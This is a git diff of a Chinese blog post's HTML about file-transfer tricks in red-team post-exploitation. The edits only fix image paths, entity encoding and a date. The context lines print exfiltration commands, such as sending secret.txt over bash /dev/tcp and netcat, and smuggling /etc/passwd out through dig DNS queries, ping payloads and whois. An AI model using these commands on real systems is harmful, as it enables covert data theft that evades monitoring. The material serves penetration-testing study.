@@ -181,7 +181,7 @@ perl -MIO::All -e &#39;io(&quot;:8080&quot;)-&gt;fork-&gt;accept-&gt;(sub &#123;
 &#125;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>效果：</p>
-<p><img src="%5C2019%5C03%5C%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7%5C2019-03-05-062002.png" alt="img"></p>
+<p><img src="/2019/03/%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7/%5C2019-03-05-062002.png" alt="img"></p>
 <h3 id="Setup-HTTP-PUT-server"><a href="#Setup-HTTP-PUT-server" class="headerlink" title="Setup HTTP PUT server"></a>Setup HTTP PUT server</h3><p>以下列出了上传文件到 HTTP Server 的几种方法</p>
 <h4 id="使用-Nginx-搭建-HTTP-PUT-Server"><a href="#使用-Nginx-搭建-HTTP-PUT-Server" class="headerlink" title="使用 Nginx 搭建 HTTP PUT Server"></a>使用 Nginx 搭建 HTTP PUT Server</h4><pre class="line-numbers language-none"><code class="language-none">mkdir -p &#x2F;var&#x2F;www&#x2F;upload&#x2F; # 创建目录 
 chown www-data:www-data &#x2F;var&#x2F;www&#x2F;upload&#x2F; # 修改目录所属用户和组
@@ -258,7 +258,7 @@ Starting a HTTP PUT Server on 10.10.10.100 port 1337 (http:&#x2F;&#x2F;10.10.10.
 Invoke-RestMethod -Uri http:&#x2F;&#x2F;ip:port&#x2F;secret.txt -Method PUT -Body $body
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h3 id="使用-Bash-dev-tcp-进行文件传输"><a href="#使用-Bash-dev-tcp-进行文件传输" class="headerlink" title="使用 Bash /dev/tcp 进行文件传输"></a>使用 Bash /dev/tcp 进行文件传输</h3><p>首先需要监听端口</p>
+<h3 id="使用-Bash-x2F-dev-x2F-tcp-进行文件传输"><a href="#使用-Bash-x2F-dev-x2F-tcp-进行文件传输" class="headerlink" title="使用 Bash &#x2F;dev&#x2F;tcp 进行文件传输"></a>使用 Bash &#x2F;dev&#x2F;tcp 进行文件传输</h3><p>首先需要监听端口</p>
 <p>接收端:</p>
 <pre class="line-numbers language-none"><code class="language-none">nc -lvnp 1337 &gt; secret.txt 
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -267,7 +267,7 @@ Invoke-RestMethod -Uri http:&#x2F;&#x2F;ip:port&#x2F;secret.txt -Method PUT -Bod
 <pre class="line-numbers language-none"><code class="language-none">cat secret.txt &gt; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="%5C2019%5C03%5C%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7%5C2019-03-05-060100.png" alt="img"></p>
+<p><img src="/2019/03/%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7/%5C2019-03-05-060100.png" alt="img"></p>
 <h3 id="使用-SMB-协议进行文件传输"><a href="#使用-SMB-协议进行文件传输" class="headerlink" title="使用 SMB 协议进行文件传输"></a>使用 SMB 协议进行文件传输</h3><h4 id="搭建简易-SMB-Server"><a href="#搭建简易-SMB-Server" class="headerlink" title="搭建简易 SMB Server"></a>搭建简易 SMB Server</h4><p>搭建简易SMB Server 需要用到 <a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">Impacket</a> 项目的 <code>smbserver.py</code> 文件</p>
 <p><code>Impacket</code> 已默认安装在 Kali Linux 系统中</p>
 <p><strong>syntax:</strong> <code>impacker-smbserver ShareName SharePath</code></p>
@@ -277,7 +277,7 @@ $ impacket-smbserver share &#96;pwd&#96; # 在当前目录启动 SMB server，�
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>效果：</p>
-<p><img src="%5C2019%5C03%5C%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7%5C2019-01-13-151350.png" alt="img"></p>
+<p><img src="/2019/03/%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7/%5C2019-01-13-151350.png" alt="img"></p>
 <h4 id="从-SMB-server-下载文件"><a href="#从-SMB-server-下载文件" class="headerlink" title="从 SMB server 下载文件"></a>从 SMB server 下载文件</h4><pre class="line-numbers language-none"><code class="language-none">copy \\IP\ShareName\file.exe file.exe
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -288,7 +288,7 @@ copy file.txt x:
 net use x: &#x2F;delete
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="使用-whois-命令进行文件传输"><a href="#使用-whois-命令进行文件传输" class="headerlink" title="使用 whois 命令进行文件传输"></a>使用 whois 命令进行文件传输</h4><p>graph LR A[Host A] – /etc/passwd –&gt; B[Host B]</p>
+<h4 id="使用-whois-命令进行文件传输"><a href="#使用-whois-命令进行文件传输" class="headerlink" title="使用 whois 命令进行文件传输"></a>使用 whois 命令进行文件传输</h4><p>graph LR A[Host A] – &#x2F;etc&#x2F;passwd –&gt; B[Host B]</p>
 <p>接收端 Host B：</p>
 <pre class="line-numbers language-none"><code class="language-none">nc -vlnp 1337 | sed &quot;s&#x2F; &#x2F;&#x2F;g&quot; | base64 -d 
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -298,7 +298,7 @@ net use x: &#x2F;delete
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>效果：</p>
-<p><img src="%5C2019%5C03%5C%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7%5C2019-01-13-082852.png" alt="img"></p>
+<p><img src="/2019/03/%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7/%5C2019-01-13-082852.png" alt="img"></p>
 <h4 id="使用-ping-命令进行文件传输"><a href="#使用-ping-命令进行文件传输" class="headerlink" title="使用 ping 命令进行文件传输"></a>使用 ping 命令进行文件传输</h4><p>graph LR A[Sender] – secret.txt –&gt; B[Reciver]</p>
 <p>发送端:</p>
 <pre class="line-numbers language-none"><code class="language-none">xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done
@@ -329,8 +329,8 @@ sniff(iface&#x3D;&quot;eth0&quot;, prn&#x3D;process_packet)
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>效果</p>
-<p><img src="%5C2019%5C03%5C%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7%5C2019-01-13-082203.png" alt="img"></p>
-<h4 id="使用-dig-命令进行文件传输"><a href="#使用-dig-命令进行文件传输" class="headerlink" title="使用 dig 命令进行文件传输"></a>使用 dig 命令进行文件传输</h4><p>graph LR A[Sender] – /etc/passwd –&gt; B[Reciver]</p>
+<p><img src="/2019/03/%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7/%5C2019-01-13-082203.png" alt="img"></p>
+<h4 id="使用-dig-命令进行文件传输"><a href="#使用-dig-命令进行文件传输" class="headerlink" title="使用 dig 命令进行文件传输"></a>使用 dig 命令进行文件传输</h4><p>graph LR A[Sender] – &#x2F;etc&#x2F;passwd –&gt; B[Reciver]</p>
 <p>发送端:</p>
 <pre class="line-numbers language-none"><code class="language-none">xxd -p -c 31 &#x2F;etc&#x2F;passwd | while read line; do dig @172.16.1.100 +short +tries&#x3D;1 +time&#x3D;1 $line.gooogle.com; done
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -358,8 +358,8 @@ sniff(iface&#x3D;&quot;eth0&quot;, prn&#x3D;process_packet)
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>效果：</p>
-<p><img src="%5C2019%5C03%5C%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7%5C2019-01-13-143819.png" alt="Transfer files via dig"></p>
-<p><img src="%5C2019%5C03%5C%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7%5C2019-01-13-144638.png" alt="img"></p>
+<p><img src="/2019/03/%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7/%5C2019-01-13-143819.png" alt="Transfer files via dig"></p>
+<p><img src="/2019/03/%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7/%5C2019-01-13-144638.png" alt="img"></p>
 <h3 id="使用-NetCat-进行文件传输"><a href="#使用-NetCat-进行文件传输" class="headerlink" title="使用 NetCat 进行文件传输"></a>使用 NetCat 进行文件传输</h3><p>graph LR Sender[A:10.10.10.100] – 1.txt –&gt; Reciver[B:10.10.10.200]</p>
 <p>接受端:</p>
 <pre class="line-numbers language-none"><code class="language-none">nc -l -p 1337 &gt; 1.txt
@@ -373,11 +373,11 @@ sniff(iface&#x3D;&quot;eth0&quot;, prn&#x3D;process_packet)
 <pre class="line-numbers language-none"><code class="language-none">nc 10.10.10.200 1337 &lt; 1.txt
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>在极端环境下，如果接受端没有 nc 可以使用 Bash 的 /dev/tcp 接收文件:</p>
+<p>在极端环境下，如果接受端没有 nc 可以使用 Bash 的 &#x2F;dev&#x2F;tcp 接收文件:</p>
 <pre class="line-numbers language-none"><code class="language-none">cat &lt; &#x2F;dev&#x2F;tcp&#x2F;10.10.10.200&#x2F;1337 &gt; 1.txt
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="%5C2019%5C03%5C%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7%5C2019-03-05-055234.png" alt="img"></p>
+<p><img src="/2019/03/%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7/%5C2019-03-05-055234.png" alt="img"></p>
 
           </div>
           <br><br>
@@ -386,7 +386,7 @@ sniff(iface&#x3D;&quot;eth0&quot;, prn&#x3D;process_packet)
                     <p>原文作者：<a href="https://misakikata.github.io">Misaki</a>
                     <p>原文链接：<a href="https://misakikata.github.io/2019/03/%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7/">https://misakikata.github.io/2019/03/%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7/</a>
                     <p>发表日期：<a href="https://misakikata.github.io/2019/03/%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7/">March 8th 2019, 9:25:06 am</a>
-                    <p>更新日期：<a href="https://misakikata.github.io/2019/03/%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7/">March 8th 2019, 9:40:57 am</a>
+                    <p>更新日期：<a href="https://misakikata.github.io/2019/03/%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7/">January 9th 2023, 11:05:26 am</a>
                     <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
                 </div>
               
